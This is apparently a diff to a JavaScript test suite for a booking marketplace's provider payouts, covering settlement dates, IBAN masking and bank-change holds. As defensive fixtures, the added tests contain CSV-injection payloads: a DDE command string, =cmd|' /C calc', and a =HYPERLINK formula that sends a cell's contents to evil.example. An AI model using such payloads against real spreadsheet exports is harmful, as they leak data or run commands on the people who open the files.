@@ -54,7 +54,9 @@ async function applyProvider(key, providerName, email) {
   P[key] = { id, cookie, serviceId: s.data.service.id };
 }
 
-/** Book, confirm and pay a trove booking for provider `key`; optionally mark it done an hour ago. */
+/** Book, confirm and pay a trove booking for provider `key`. `done`: the
+ *  service took place 40 days ago (well before this fortnight's run, with the
+ *  complaint window closed) and the provider marked it done — i.e. payable. */
 async function paidBooking(key, { done = true, serviceDate = dayFromNow(1) } = {}) {
   const r = await api('POST', `/api/services/${P[key].serviceId}/book`, { body: GUEST, headers: { 'x-forwarded-for': `198.51.100.${++ipN}` } });
   assert.equal(r.status, 201, r.text);
@@ -67,8 +69,8 @@ async function paidBooking(key, { done = true, serviceDate = dayFromNow(1) } = {
     metadata: { kind: 'service_booking', booking_id: String(id), code: bk.code } } } });
   assert.equal(w.status, 200);
   if (done) {
+    db.prepare('UPDATE service_bookings SET service_date=? WHERE id=?').run(dayFromNow(-40), id);
     assert.equal((await api('PATCH', `/api/provider/bookings/${id}`, { cookie: P[key].cookie, body: { action: 'complete' } })).status, 200);
-    db.prepare("UPDATE service_bookings SET completed_at=datetime('now','-1 hour') WHERE id=?").run(id);
   }
   return db.prepare('SELECT * FROM service_bookings WHERE id=?').get(id);
 }
@@ -127,7 +129,7 @@ test('bank details are validated with the seller IBAN rules', async () => {
 test('the IBAN is encrypted at rest and only ever returned masked', async () => {
   const r = await api('PUT', '/api/provider/payout', { cookie: P.A.cookie, body: { accountName: 'Noor Hassan', bankName: 'Mashreq', iban: 'ae07 0331 2345 6789 0123 456' } });
   assert.equal(r.status, 200, r.text);
-  assert.deepEqual({ ...r.data.details, updatedAt: undefined }, { accountName: 'Noor Hassan', bankName: 'Mashreq', iban: 'AE·· ···· 3456', source: 'own', updatedAt: undefined });
+  assert.deepEqual({ ...r.data.details, updatedAt: undefined }, { accountName: 'Noor Hassan', bankName: 'Mashreq', iban: 'AE·· ···· 3456', source: 'own', updatedAt: undefined, held: false });
   assert.equal(r.data.needsDetails, false);
   const row = detailsRow('A');
   assert.notEqual(row.iban_encrypted, IBAN_A);
@@ -254,7 +256,7 @@ test('the payer name comes from PROVIDER_PAYER_NAME when set', async () => {
 
 /* ---------------- the provider's statement ---------------- */
 
-test('the provider sees waiting, payable and paid for each fee', async () => {
+test('the provider sees provisional, ready and paid for each fee', async () => {
   const a = await payout('A');
   const byCode = Object.fromEntries(a.data.credits.map((c) => [c.code, c]));
   assert.equal(byCode[bkA.code].status, 'paid');
@@ -262,10 +264,16 @@ test('the provider sees waiting, payable and paid for each fee', async () => {
   assert.equal(byCode[bkA.code].payer, 'Serein Consultancy');
   assert.match(byCode[bkA.code].paidOn, /^\d{4}-\d{2}-\d{2}$/);
   assert.equal(byCode[bkA.code].amountCents, 36000);
-  assert.equal(byCode[bkA2.code].status, 'waiting');
-  assert.equal(byCode[bkA2.code].payableOn, dayFromNow(8), 'service date + 3 days');
+  assert.equal(byCode[bkA2.code].status, 'provisional');
+  assert.equal(byCode[bkA2.code].readyOn, dayFromNow(9), 'the day after service date + the 3-day window');
+  assert.equal(byCode[bkA2.code].payoutOn, require('../src/settlement').nextRunDate(dayFromNow(9)), 'the first fortnightly run after that');
+  assert.equal(require('../src/settlement').isRunDate(byCode[bkA2.code].payoutOn), true, 'a run Tuesday');
+  assert.equal(a.data.earnings.provisionalCents, 36000, 'the not-yet-due fee is provisional');
+  assert.equal(a.data.earnings.readyCents, 0);
   const c = await payout('C');
-  assert.equal(c.data.credits[0].status, 'payable');
+  assert.equal(c.data.credits[0].status, 'ready');
+  assert.equal(c.data.earnings.readyCents, 36000);
+  assert.equal(c.data.earnings.nextPayoutDate, require('../src/settlement').lastRunDate(), 'already due: goes with this fortnight\'s batch');
   assert.equal(c.data.needsDetails, true);
   for (const res of [a, c]) {
     for (const secret of ['Sara', 'sara@test.local', '222 3344']) assert.ok(!res.text.includes(secret), 'no customer data in the statement');
@@ -278,4 +286,65 @@ test('an account with no provider profile gets no payout endpoint', async () => 
   const r = await api('GET', '/api/provider/payout', { cookie: adminCookie });
   assert.equal(r.status, 403);
   assert.equal((await api('PUT', '/api/provider/payout', { body: { useShop: true } })).status, 401);
+});
+
+/* ---------------- bank changes and the CSV (review round 2026-10-02) ---------------- */
+
+test('payout names that start like a spreadsheet formula are refused', async () => {
+  const put = (body) => api('PUT', '/api/provider/payout', { cookie: P.C.cookie, body: { accountName: 'Clay Days', bankName: 'ADCB', iban: IBAN_A, ...body } });
+  assert.equal((await put({ accountName: "=cmd|' /C calc'!A0" })).status, 400);
+  assert.equal((await put({ bankName: '@SUM(1+1)' })).status, 400);
+  assert.equal((await put({ accountName: '-1+2' })).status, 400);
+  assert.equal(detailsRow('C'), undefined, 'nothing saved');
+});
+
+test('changing provider bank details needs the password, emails the owner and holds the next transfer', async () => {
+  const IBAN_NEW = ibanFor('026', '0001015555555555');
+  const bk = await paidBooking('A'); // a new payable fee for A
+  const put = (body) => api('PUT', '/api/provider/payout', { cookie: P.A.cookie, body: { accountName: 'Someone Else', bankName: 'Mashreq Bank', iban: IBAN_NEW, ...body } });
+  assert.equal((await payout('A')).data.passwordToChange, true, 'the dashboard knows to ask for it');
+  const none = await put({});
+  assert.equal(none.status, 400);
+  assert.equal(none.data.code, 'wrong_password');
+  assert.equal((await put({ currentPassword: 'wrong-pass-1' })).status, 400);
+  assert.equal(require('../src/crypto').decrypt(detailsRow('A').iban_encrypted), IBAN_A, 'unchanged');
+
+  sent.length = 0;
+  const ok = await put({ currentPassword: 'testpass123' });
+  assert.equal(ok.status, 200, ok.text);
+  assert.equal(ok.data.details.held, true);
+  assert.equal(detailsRow('A').hold_reason, 'bank_details_changed');
+  await new Promise((res) => setTimeout(res, 20));
+  const mail = sent.find((m) => m.to === 'noor@test.local');
+  assert.ok(mail && /bank details were changed/.test(mail.subject));
+  assert.ok(!mail.html.includes(IBAN_NEW) && !mail.html.includes(IBAN_NEW.slice(4)), 'masked only');
+
+  // held: not in the transfer file, Mark paid refused
+  const adm = await api('GET', '/api/admin/service-credits', { cookie: adminCookie });
+  assert.equal(adm.data.excluded.find((x) => x.providerId === P.A.id).reason, 'bank_details_changed');
+  const csv = await api('GET', '/api/admin/provider-payouts/export.csv', { cookie: adminCookie });
+  assert.ok(!csv.text.includes(bk.code) && !csv.text.includes(IBAN_NEW), 'held back from the file');
+  const paid = await api('POST', `/api/admin/service-credits/${P.A.id}/paid`, { cookie: adminCookie, body: {} });
+  assert.equal(paid.status, 409);
+  assert.match(paid.data.error, /changed their bank details/);
+
+  // the owner checks it, releases the hold; the next file pays the new account
+  assert.equal((await api('POST', `/api/admin/service-credits/${P.A.id}/release-hold`, { cookie: P.A.cookie, body: {} })).status, 403);
+  assert.equal((await api('POST', `/api/admin/service-credits/${P.A.id}/release-hold`, { cookie: adminCookie, body: {} })).status, 200);
+  const csv2 = await api('GET', '/api/admin/provider-payouts/export.csv', { cookie: adminCookie });
+  assert.ok(csv2.text.includes(IBAN_NEW) && csv2.text.includes(bk.code));
+
+  // saving the same account again is not a change
+  assert.equal((await put({ currentPassword: 'testpass123' })).status, 200);
+  assert.equal(detailsRow('A').hold_reason, '');
+});
+
+test('the provider transfer file defuses formula-looking practice names', async () => {
+  db.prepare('UPDATE service_providers SET name=? WHERE id=?').run('=HYPERLINK("https://evil.example/?"&D2,"x")', P.A.id);
+  try {
+    await paidBooking('A');
+    const csv = await api('GET', '/api/admin/provider-payouts/export.csv', { cookie: adminCookie });
+    const line = csv.text.split('\r\n').find((l) => l.includes('HYPERLINK'));
+    assert.ok(line && line.startsWith(`"'=HYPERLINK(`), line);
+  } finally { db.prepare('UPDATE service_providers SET name=? WHERE id=?').run('Noor Frames', P.A.id); }
 });
